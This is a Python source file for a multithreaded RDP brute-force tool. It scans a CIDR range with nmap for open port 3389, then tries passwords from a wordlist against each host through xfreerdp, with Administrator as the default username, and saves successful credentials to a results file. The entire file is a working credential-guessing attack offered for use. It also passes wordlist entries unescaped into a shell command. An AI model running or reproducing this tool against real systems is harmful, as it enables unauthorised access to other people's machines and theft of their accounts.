import os
import sys
import time
import logging
import subprocess
from concurrent.futures import ThreadPoolExecutor
from ipaddress import ip_network
import nmap
from queue import Queue
import socket
from colorama import Fore, Style, init
import pyfiglet
from random import choice


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'rdp_brute_force.log'), 
                    level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken RDP Brute-Force")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def check_rdp_access(ip, rdp_port=3389):
    """Checks if RDP access is possible on the given IP and port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, rdp_port))
            return result == 0
    except Exception as e:
        logging.error(f"Error checking RDP access: {e}")
        return False

def brute_force(ip, username, rdp_port, password_queue):
    """Attempts to brute force the RDP credentials."""
    attempt_number = 0
    total_attempts = password_queue.qsize()
    start_time = time.time()

    while not password_queue.empty():
        password = password_queue.get()
        attempt_number += 1
        cmd = f'xfreerdp /u:{username} /p:{password} /v:{ip} /port:{rdp_port} +auth-only'
        result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))

        if result == 0:
            success_msg = f"\n[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password} - Success"
            sys.stdout.write('\033[K')  
            print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
            logging.info(success_msg.strip())
            with open(os.path.join(results_dir, 'rdp_successful_attempts.txt'), 'a') as result_file:
                result_file.write(success_msg.strip() + '\n')
            os._exit(0)
        else:
            sys.stdout.write('\033[K')  
            print(Fore.WHITE + f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password}", end='', flush=True)
            logging.debug(f'Failed attempt for IP: {ip}, Username: {username}, Password: {password}')

def scan_rdp_ports(ip):
    """Scans the given IP to check if RDP port 3389 is open."""
    nm = nmap.PortScanner()
    nm.scan(ip, arguments='-p 3389 -Pn')
    state = 'tcp' in nm[ip] and nm[ip]['tcp'][3389]['state'] == 'open'
    logging.info(f"RDP port scan result for {ip}: {'open' if state else 'closed'}")
    return state

def main():
    clear_console()
    display_banner()

    ip_range_input = input(Fore.WHITE + "Enter IP range (CIDR notation): ").strip()
    username = input(Fore.WHITE + "Enter username (default: Administrator, press Enter for default): ").strip() or 'Administrator'
    password_file = input(Fore.WHITE + "Enter path to password file or press Enter to use default ('wordlists/rdp_wordlists.txt'): ").strip() or os.path.join(script_dir, "..", "wordlists", "rdp_wordlists.txt")
    threads = int(input(Fore.WHITE + "Enter number of threads to use (default 40, press Enter for default): ").strip() or 40)

    try:
        ip_range = ip_network(ip_range_input)
        passwords = open(password_file, 'r').read().splitlines()
    except FileNotFoundError:
        logging.error("Password file not found.")
        return
    except ValueError as e:
        logging.error(f"IP Range error: {e}")
        return

    password_queue = Queue()
    for password in passwords:
        password_queue.put(password)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for ip in ip_range.hosts():
            ip_str = str(ip)
            if scan_rdp_ports(ip_str):
                logging.info(f"RDP server found at {ip_str}")
                executor.submit(brute_force, ip_str, username, 3389, password_queue)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "\nScript interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
